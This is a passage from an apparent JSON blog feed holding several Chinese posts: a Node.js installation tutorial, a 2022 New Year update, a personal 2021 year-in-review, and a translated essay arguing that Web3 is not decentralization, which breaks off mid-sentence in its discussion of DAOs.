10:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h2>\n<ul>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li>\n<li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-nodejs\">安装 Node.js</a></li>\n</ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Node.js 官网 (<a href=\"https://node.js.org/\">https://node.js.org</a>)</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/image-20220114174925675.png\" alt=\"image-20220114174925675\"></p>\n<p>下载 Node.js 安装包（推荐下载 LTS 版本）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175645.png\" alt=\"image-20220114175645642\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175750.png\" alt=\"image-20220114175749822\"></p>\n<p>勾选同意协议，点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175835.png\" alt=\"image-20220114175835742\"></p>\n<p>修改文件安装位置，点击 <code>Next</code>。（也可以不用改）</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114175929.png\" alt=\"image-20220114175929226\"></p>\n<p>点击 <code>Next</code>。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180010.png\" alt=\"image-20220114180010036\"></p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180044.png\" alt=\"image-20220114180043895\"></p>\n<p>点击 <code>Install</code> 开始安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180108.png\" alt=\"image-20220114180107827\"></p>\n<p>等待安装完成。<img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180122.png\" alt=\"image-20220114180122728\"></p>\n<p>点击 <code>Finish</code> 完成安装。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180206.png\" alt=\"image-20220114180206024\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>打开 <code>Git Bash</code>.</p>\n<blockquote><p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。<br>或是在开始菜单中找到 Git Bash.</p></blockquote>\n<p>输入 <code>node -v</code> 和 <code>npm -v</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://unpkg.zhimg.com/ocoke-osg@0.0.14/rawimg/20220114180458.png\" alt=\"image-20220114180458685\"></p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-nodejs/"},{"title":"2022: 新年快乐！","date":"2021-12-31 16:00:00","description":"\n<p>转眼间，2021 年已经过去。这一年非常忙碌，以至于博客一周年的纪念来不及写，许多文章计划停留在了 To Do 里。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%8D%9A%E5%AE%A2\" class=\"headerlink\" title=\"博客\"></a>博客</h2>\n<p>由于 Cloudflare Web Analytics 是在 2021 年 4 月份启用的，再加上后来又将统计代码去除，所以关于访问量的信息不可用。</p>\n<p>截止至 2021 年 12 月 31 日，博客共发布 15 篇文章，其中 2021 年发布 11 篇文章，原创文章 10 篇。</p>\n<p>目前采用 <code>LeanCloud + Waline</code> 的评论方式，自 7 月份被刷评论后将评论权限改为登录（支持 <code>GitHub</code> 登录），还有部分评论在迁移中丢失，实在抱歉。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>博客自 2021 年 1 月 13 日将主题改为 <code>Miracle</code>，这是一款简洁、轻量的单栏 Hexo 主题。</p>\n<p><code>Miralce</code> 目前的版本是 <code>2.0.1</code>，全新的版本去除 jQuery，进一步提升性能。</p>\n<p>GitHub 仓库：<a href=\"https://github.com/hifun-team/hexo-theme-miracle\">https://github.com/hifun-team/hexo-theme-miracle</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%9B%B4%E5%A4%9A\" class=\"headerlink\" title=\"更多\"></a>更多</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">=&gt; ...</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2022/"},{"title":"无垠 2021 年度总结","date":"2021-12-31 08:36:10","description":"\n<p>真是忙碌的一年啊。转眼 2021 已经过去，2022 即将到来。又到了该总结这一年的时候了。</p>\n<h1>统计数据</h1>\n<p>年度总结的第一部分仍然是一些统计数据。以下数据截止 2021 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 29,073 (<span>+0.6%</span>)，年 PV 67,688 (<span>-11.61%</span>)，日均 UV 79.65，平均停留时间 3分34秒 (<span>-13.7%</span>)，平均跳出率 55% (<span>-9.8%</span>)。一年有效文章数 1 (<span>-80%</span>)，新增评论 109 条 (<span>-54.96%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg\" alt=\"\" width=\"515\" height=\"620\" class=\"aligncenter size-full wp-image-2537\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/blog-249x300.jpg 249w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>除了 UV 较去年提高 100 多之外，其他数据全部下滑。主要原因还是因为今年实在太过忙碌，只更新了一篇博客，评论区也没有怎么维护。不过目前已经有两篇新的文章在路上了，希望可以尽快写完吧。</p>\n<h2>个人主页</h2>\n<p>个人页总 UV 3,515 (<span>-18.12%</span>)，总 PV 3,929 (<span>-4.56%</span>)，日均 UV 9.63，平均停留时间 55秒 (<span>-12.7%</span>)。访问的主要来源是知乎和 GitHub。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg\" alt=\"\" width=\"515\" height=\"647\" class=\"aligncenter size-full wp-image-2538\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton.jpg 515w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/axton-239x300.jpg 239w\" sizes=\"(max-width: 515px) 100vw, 515px\"></a>\n<p>仍然是没有更新个人主页的一年，我也没有继续宣传这个页面，统计数据下滑大概是正常的。</p>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 4 次，新增 149 commits (<span>-54.57%</span>)，Star 数增加了 174，现有 788。</p>\n<p>终于，MDx 2.0 发布了。但是因为今年的过于忙碌，MDx 并没有得到足够的维护，版本发布周期也拉得比较长，很多 Bug 没能及时修复。希望明年可以把更多的时间花在维护 MDx 上。无论如何，还是感谢各位对于 MDx 的支持！</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>2021 大事记</h1>\n<p>说起来，2021 真的太多“第一次”了...</p>\n<ul>\n<li>一月：由于电脑电池鼓包，第一次用 iPad 外接屏幕远程桌面到服务器来考期末🌚太痛苦了</li>\n<li>一月：MDx 喜提 600 Stars</li>\n<li>三月：第一次测核酸（真的酸）</li>\n<li>三月：第一次坐上 A350！(B-309W）</li>\n<li>三月：第一次来到英国</li>\n<li>六月：第一次来到伦敦</li>\n<li>六月：第一次去猫咖撸猫🐱</li>\n<li>六月：第一次坐上 B777！(B-2025）</li>\n<li>七月：酒店隔离十四天🌚</li>\n<li>七月：MDx 喜提 700 Stars</li>\n<li>七月：第一次和猫一起住（时刻有猫撸真的爽😆）</li>\n<li>七月：入职<a href=\"https://75.team/\">奇舞团</a>实习</li>\n<li>八月：北京景点怎么这么多</li>\n<li>九月：北京景点怎么还有这么多</li>\n<li>九月：<a href=\"https://flyhigher.top/develop/2160.html\">谈谈 WebAuthn</a> 被 <a href=\"https://weibo.com/1893751011/KyipM3tOM\" rel=\"noopener noreferrer\">w3c中国微博转发</a><del>（虽然并没有人看）</del>\n</li>\n<li>九月：从奇舞团<del>跑路</del>\n</li>\n<li>九月：整了个 Stackoverflow 的复制粘贴键盘<del>，太好用了</del>\n</li>\n<li>十月：终于买了心心念念的 MSFS</li>\n<li>十一月：终于买了一台新相机</li>\n<li>十一月：第一次坐上 A380！(B-6140）</li>\n<li>十二月：第一次来到爱丁堡并和 <a href=\"https://diygod.me/\">@DIYgod</a> 面基</li>\n</ul>\n<section><div class=\"set-images-div\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg\" alt=\"和猫一起住的唯一问题就是手机很快会被猫片塞满\" width=\"730\" height=\"1500\" class=\"aligncenter size-full wp-image-2518\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats.jpg 730w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-146x300.jpg 146w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cats-498x1024.jpg 498w\" sizes=\"(max-width: 730px) 100vw, 730px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg\" alt=\"看到你在写前端，猫猫很担心你\" width=\"1004\" height=\"1500\" class=\"aligncenter size-full wp-image-2523\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat.jpg 1004w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-201x300.jpg 201w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-685x1024.jpg 685w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cat-768x1147.jpg 768w\" sizes=\"(max-width: 1004px) 100vw, 1004px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg\" alt=\"高效开发工具（确信\" width=\"1500\" height=\"1019\" class=\"aligncenter size-full wp-image-2519\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-300x204.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-1024x696.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/cv-768x522.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg\" alt=\"和 Ralph 在天坛\" width=\"947\" height=\"1500\" class=\"aligncenter size-full wp-image-2524\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt.jpg 947w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-189x300.jpg 189w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-646x1024.jpg 646w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/tt-768x1216.jpg 768w\" sizes=\"(max-width: 947px) 100vw, 947px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg\" alt=\"380!\" width=\"1500\" height=\"874\" class=\"aligncenter size-full wp-image-2517\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/380.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-300x175.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-1024x597.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/380-768x447.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a>\n</div>\n<div class=\"set-images-div2\">\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg\" alt=\"到处玩.jpg\" width=\"1500\" height=\"1080\" class=\"aligncenter size-full wp-image-2521\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2.jpg 1500w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-300x216.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-1024x737.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play2-768x553.jpg 768w\" sizes=\"(max-width: 1500px) 100vw, 1500px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg\" alt=\"还是到处玩.jpg\" width=\"977\" height=\"1500\" class=\"aligncenter size-full wp-image-2520\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/play.jpg 977w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-195x300.jpg 195w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-667x1024.jpg 667w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/play-768x1179.jpg 768w\" sizes=\"(max-width: 977px) 100vw, 977px\"></a><br><a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg\" alt=\"380 上的星空\" width=\"1002\" height=\"1500\" class=\"aligncenter size-full wp-image-2522\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars.jpg 1002w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-200x300.jpg 200w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-684x1024.jpg 684w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/stars-768x1150.jpg 768w\" sizes=\"(max-width: 1002px) 100vw, 1002px\"></a>\n</div>\n</section><p><span>点击图片查看描述</span></p>\n<p>对了，对于可爱的猫猫们，我整了一个 Telegram 贴纸包，你可以在这里获取：<a href=\"https://telegram.me/addstickers/huanAndDan\">https://telegram.me/addstickers/huanAndDan</a>。</p>\n<h1>跨年红包</h1>\n<p>今年的解题之旅，从下面这张图片开始：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/b.jpg\" alt=\"\" width=\"1510\" height=\"1250\" class=\"aligncenter size-full wp-image-2556\"></a>\n<p>不过，鉴于今年的题目较以往对于认真解题的人更难，我还准备了隐藏红包，在解题中收集线索即可发现隐藏红包。共有 20 个普通红包和 10 个隐藏红包。</p>\n<p>解题计划持续到东八区 2022.02.03 23:59:59 或红包被领完为止，之后我会发布题解。不过由于去年情况混乱，今年在解题过程中我一旦发现有不正常的现象就会立即停止活动。Anyway，新年快乐！祝玩得开心。</p>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报用到了 PS 和 Adobe 家的新玩具 Dimension。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg\" alt=\"\" width=\"707\" height=\"1000\" class=\"aligncenter size-full wp-image-2547\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1.jpg 1414w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-212x300.jpg 212w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-724x1024.jpg 724w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-768x1086.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/12/2022-in-post-1-1086x1536.jpg 1086w\" sizes=\"(max-width: 707px) 100vw, 707px\"></a>\n<p>那么祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2507.html"},{"title":"[译] 不，Web3 不是去中心化","date":"2021-12-14 14:01:00","description":"\n<h2>来自译者的楔子</h2>\n<p>加密货币社区对元宇宙和 Web3 的狂热仍在继续，大量投资人和开发者前仆后继加入其中。但是，Web3 真的能实现支持者们的种种愿景吗？亦或是另一个镜中月、水中花？也许让历史照进现实，能给我们答案。<br>这是自 <a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">Web3 系列的引子之后</a>，这个系列的第一篇文章。</p>\n<blockquote><p>原文标题：Web3 is not decentralization<br>原文链接：<a href=\"https://invisibleup.com/articles/38/\">https://invisibleup.com/articles/38/</a><br>原文作者：<a href=\"https://invisibleup.com/\">InvisibleUp</a><br>译者：<a href=\"https://skk.moe/\">Sukka</a>，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<p>不，真的。Web3 并不是去中心化。我觉得这应该很明显。我原本以为我不需要一整篇文章来阐述这个问题，但我想我确实需要。</p>\n<p>令我感到吃惊的是，像 Reddit、Twitter 和 Discord 这样的科技巨头突然决定全力投入到 NFT 中，以达到「去中心化」的目的，尤其是其中 Reddit 的做法令我尤为生气。在 <a href=\"https://www.coindesk.com/markets/2020/05/14/reddit-rolls-out-community-points-on-ethereum-to-incentivize-positive-behavior/\">2020 年 5 月</a>左右，他们在 <code>/r/FortniteBR</code> 和 <code>/r/CryptoCurrency</code> 中实验性的启动了一个「社区代币」系统，虽然我从未去过这两个 Subreddit，但我从一名 <a href=\"https://twitter.com/isyourguy/status/1457220590004158468\">来自 Reddit 的开发者的 Twitter 推文中</a> 得知，他们正在计划将 Reddit 的 Karma Point 转换为这些代币。</p>\n<blockquote><p>译者注：关于 Reddit 将 Karma 转变为 ERC-20 代币系统一事，我曾经在我的 Web3 系列文章与译文中引用过一篇 <a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">相关的新闻报道</a></p></blockquote>\n<p>在我列举的三家科技巨头中，Reddit 是走出最远的、愿景最具体的——Twitter 的为用户上传的图片添加 NFT 标签的计划依然停留在纸面上、而 Discord 在其用户的强烈反对下无限期暂停了他们的计划。因此，我在这里主要介绍 Reddit 目前已经公开的计划和路线图。简而言之，Web 1.0 是一个伟大的去中心化前沿阵地、Web 2.0 是一堆有墙的花园、有许多缺点。我完全赞同这个观点。然而，Reddit 正在加入其他公司的 Web3 的行列、准备通过分配基于以太坊的加密货币、赋予网站用户以投票权。</p>\n<p>我之后再分析这句话是什么意思，现在你只要对这句话有点印象就好了。</p>\n<h2>旧互联网上的去中心化</h2>\n<p>让我们复习一下互联网的历史，上个世纪 80 年代、互联网的起源时期。在那个年代，互联网分为两大阵营，来自 MIT、国防部和欧洲原子能研究中心（译者注：Web 之父 蒂姆·博纳斯·李 就是在欧洲原子能研究中心提出了关于互联网、HTTP 的构想）的 ARPANET，和民间的临时性的、自制的调制解调器。</p>\n<p>ARPANET（现代互联网的直接技术先驱）在设计时就明确考虑到了网络层面的冗余和路由的灵活性。如果苏联人的核武器摧毁了重要城市的战略数据中心，只要 A 与 B 两点之间仍然存在数据通路（如微波），那么电子信息就依然可以传输。这个设计也有缺点，文件分享与数据传输（译者注：指 FTP 和 Gopher。FTP 发明于 1971 年，而 HTTP 诞生于 1992 年，此时冷战已经结束、核战争的威胁已经不复存在）仍然需要服务器才能运行，这意味着如果加利福尼亚被外星人攻击了，你就无法访问来自斯坦福大学的文件。但是，诸如电子邮件、IRC、尤其是 Usenet 等协议的发展，确保了互联网上从服务器到服务器传输信息的能力、从而在整个网络上创造了一个单一的信息来源。</p>\n<p>抛开美国国防部的 ARPANET，有抱负的黑客和公司正在忙于创建公告板系统。一般的，他们会在自己的电脑上运行一个程序，其他的电脑可以通过调制解调器连接，在两台电脑之间实现了一个一对一的直接连接。但是，为了和不止一台电脑连接，你需要挂断一个电话、断开与前一台计算机的链接，然后拨打下一个号码。受限于调制解调器，只有最重要的信息会被下载，导致了孤岛的诞生，如同 Web3 支持者批判的 Web 2.0 孤岛一样。</p>\n<p>为了解决这个问题，人们设计了一些变通方法，其中一个例子就是 UUCP（译者注：BSD-based 的操作系统如 FreeBSD 和 macOS，依然保留了 UUCP 的二进制，你可以在终端中输入 <code>uucp</code> 试试），实现了从 Unix 服务器到 Unix 服务器的信息拷贝。通过登录到一个连接到一系列对等服务器的公共Unix服务器，你可以手动输入一个信息的路径，以到达一个特定的服务器或用户。早期版本的路径使用的地址类似于 <code>www-skk!sukka!moe</code>。自然而然的，随着互联网的发展，这种方法就被淘汰了。</p>\n<blockquote><p>译者注：关于 UUCP 和「一个信息的路径」的更多细节，你可以阅读我的博客上的另一篇译文 <a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>，这篇文章详细介绍了互联网和 URL 的变迁历史。</p></blockquote>\n<p>另一种方法是 FidoNet，在民间的 BBS 运营者中非常受欢迎。这是一个允许 BBS 与其他系统同步信息和数据的协议，能够将长途漫游电话费卸载到同一地区内的区间中。</p>\n<p>所有这些早期的交换协议使得互联网根本不存在中心。随着时间的推移，BBS 逐渐被 ISP 替代——ISP 允许你访问其他城市甚至国家的网络、将电子邮件发送到千里之外。其中一些 ISP 很快就发展成为了 ICP，如 AOL（美国在线）和雅虎的 GeoCites（前身为 贝弗利山互联网）。最终，围墙式花园的做法逐渐消失了，IETF 小组成立并开始制定关于互联网的公开规范标准，而 ISP 们则专注于维护和改进宽带基础设施（如建设数据中心、铺设跨洋光纤和骨干网）。</p>\n<h3>案例分析：Usenet</h3>\n<p>你可以把 Usenet 视为 Reddit 的前辈。因为它是一个拥有各种「不同新闻小组」的社区。虽然 Usenet 设计之初时的用途是在互联网上提供新闻，但是它很快被用于各种你能想到的话题。后来，Usenet 成为了传播盗版电影、软件和儿童色情的地下方法（是的，你依然可以通过类似 eternal september 这样的软件访问 Usenet）。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/usenet.png\" alt=\"usenet.png\" width=\"800\" height=\"600\"></p>\n<p>作为一个非常、非常简化的模型，你发送的信息会像电子邮件一样被发送到新闻组服务器，在那里它们会被发布给全世界的人看。你可以回复线程中的其他信息，或者直接向帖子的作者发送电子邮件。评论将以树状视图展开，与 Reddit 的评论系统非常相似。新闻组服务器可以选择托管某些新闻组，并定期与网络的其他部分同步，以保持所有内容的更新。Usenet 信息也可以与现有的 FidoNet 系统进行交换。在我看来，这在当时是一个设计得非常好的系统。</p>\n<p>不过，最大的问题是缺乏良好的管理控制。Usenet 上的大多数新闻组都是无节制的，这在 Spammer 和其他的什么人开始破坏空间的不成文规则之前、是完全没有问题的。由于 Usenet 固有的分散性质，追溯性地删除信息的工具是有限的。系统版主可以发送取消信息，这个过程可以由 <a href=\"https://en.wikipedia.org/wiki/Cancelbot\">取消机器人</a> 自动完成。这在当时被认为是有争议的，因为它被认为是侵犯了言论自由权。另一种方法是有节制的新闻组，即信息首先被送到新闻组管理员那里进行审批。</p>\n<p>由于大型二进制文件的泛滥，导致互联网服务供应商被迫拔线，再加上有太多的垃圾邮件无法正确应对，Usenet 基本上消亡了。作为回应，世界范围内高度规范的留言板和博客开始大量涌现，最终互联网巨头和大型网站诞生了，如 4chan、Reddit、Facebook 和 Twitter。</p>\n<h3>案例分析：IRC</h3>\n<p>IRC、即 Internet Relay Chat，是 20 世纪 80 年代末设计的一种即时通讯协议。最初，它被设计成每个用户都在同一个网络上，但不久之后，社区中的分裂导致了几个竞争性网络的产生，如 FreeNode（现在的 Libera Chat）、EFnet 和 IRCnet。较小的网络，如 tilde.chat 也存在。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.6.2/irc.png\" alt=\"irc.png\" width=\"800\" height=\"600\"></p>\n<p>IRC 也是一个分布式系统，在这个意义上，同一 IRC 网络中的多个服务器可以同步并主持相同的频道，并在服务器之间转发信息。你只需连接到离你最近的服务器，后端就会适当地转发信息。你几乎可以使用任何客户端来连接，因为与今天复杂的专有的协议相比，IRC 是一个简单而开放的协议。根据需要，附加机器人或「弹跳器」（机器人会保存信息供以后查看，因为 IRC 不支持查看历史信息）是很容易的，因为它们只不过是专门编程的客户端。</p>\n<p>IRC（通常）只能发送文本信息，没有很好的用户注册、信息回滚机制，也没有 MSN、Slack、Matrix 或 Discord 等较新的聊天应用程序的几乎任何其他功能。2003 年，随着更有说服力的替代品的出现，它开始衰退，但是它仍然被广泛用于开源技术社区和服务的后端。</p>\n<h3>案例分析：IPFS</h3>\n<p>IPFS（星际文件系统）是一个典型的现代分散协议的例子。它解决了文档和文件只有一个真实来源的问题，让任何人都可以托管一个文件的副本以提供网络冗余。</p>\n<p>IPFS 的工作方式有点笨拙，基本上是使用文件的哈希值作为其永久地址。有一些方法可以解决这个问题，比如 <a href=\"https://docs.ipfs.io/concepts/ipns/\">IPNS</a> 与 <a href=\"https://docs.ipfs.io/concepts/dnslink/\">DNSLink</a> 的结合，它给 DNS 条目提供了一个静态地址，可以引用位于 IPFS 上的任何文件。</p>\n<p>......这一节很短，因为没有太多的东西可以写。IPFS 主要负责文件。<a href=\"https://neocities.org/\">Neocities 有对它的支持</a>。然后是，与大部分人想象中的完全相反，绝大多数 NFT 艺术品其实都托管在 IPFS 上面。唯一真正的问题是，IPFS 上的文件并不是永久存在的。一个文件可能会在未来失踪，因为没有其余的主机没有这个文件的副本（如同 BitTorrent 无人做种一样），但这并不是一个真正可以现实地解决的问题。而它其实工作地相当好。</p>\n<h3>中场休息：言论自由和言论审查</h3>\n<p>让任何人能够主持任何事情的一个自然后果是——「他们可以主持任何事情」。你同意的东西，你不同意的东西，你认为绝对不道德的东西。我个人主张 「<a href=\"https://en.wikipedia.org/wiki/Paradox_of_tolerance\">宽容的悖论</a>」，主张伤害的声音应该被踢到路边。而令人惊讶的是，去中心化系统的人做到了这一点——如果一个网络上的某个特定群体相当有毒，社区可以简单地分叉，排除他们，并继续下去，有效地将不良行为者隔离在一个回声室中。Mastodon 的服务器屏蔽系统已经表明这是一个相当有效的解决方案，最近 FreeNode 的自我毁灭和与用户纷纷迁移到 Libera Chat 更是完美体现了这一点。</p>\n<p>当然，这也不是万无一失的。Parler 和 Kiwi Farms 是被排斥的社区的例子，它们仍然在做明显的伤害，比如延续导致 1 月 6 日袭击的阴谋论，或者<a href=\"https://en.wikipedia.org/wiki/Kiwi_Farms#Suicides_of_harassment_targets\">由于不断的骚扰而导致许多人自杀</a>。Kiwi Farms 勉强维持着与外部互联网的连接，因为他们的 DNS 和 DDoS 保护完全由 Cloudflare（唯一剩下的愿意与他们合作的公司）提供，他们的服务器托管全部由「1776 Solutions」内部完成，该 ISP 对外只能通过一条 Transit 连接。</p>\n<blockquote><p>译者注：在 Cloudflare 清退 8chan、Voxility 将向 8chan 敞开怀抱的 Epik, Inc. 和 BitMitigate 拔线后，8chan 最终也被托管到由 1776 Solutions（AS397702）提供的服务器。如果作为本文的读者你也是一名 ISP 从业者，我在这里倡议你在你的网络中为任何通往 AS397702 的路由设置黑洞。</p></blockquote>\n<p>归根结底，我们试图用技术解决社会文化问题，这几乎是不可能的。真正的解决方案是让人们不要成为可怕的偏执者，而我对如何实现这一点没有丝毫头绪。</p>\n<h2>Web3 的「去中心化」概念</h2>\n<p>在过去的 3600 字中，我已经花了太多的时间去研究 20-40 年前的协议。是时候让我们回到现代了。在新兴的加密货币领域，存在着「DAO」的概念，即去中心化的自治组织。<a href=\"https://ethereum.org/en/dao/\">Ethereum.org</a> 将其描述为「像一个互联网原生企业，由其成员集体拥有和管理」。从表面上看，这听起来很像共产主义、或是苏联的「农村合作社」运动。</p>\n<p>以太坊作为一种加密货币，主要存在于以太坊虚拟机上执行代码。这是一个非常奇怪的架构（基于堆栈，1024 深度，256 位比特），其状态在全球每个以太坊矿工之间共享，其输入和输出是代币，要么是可替代的（如以太坊货币），要么是不可替代的。</p>\n<p>通过智能合约在区块链上永久存储硬规则的组织，你可以在项目上花费任何货币之前强制要求投票。所说的投票（以及代码和资金和其他一切）将是完全透明的，而且组成 DAO 的智能合约将是不可改变的。</p>\n<p>虽然我可以讨论智能合约的优点，但是不可忽视的就是他们的陷阱。例如，最大的 DAO —— <a href=\"https://en.wikipedia.org/wiki/The_DAO_(organization)\">The DAO</a>，在上线伊始就因为代码 Bug 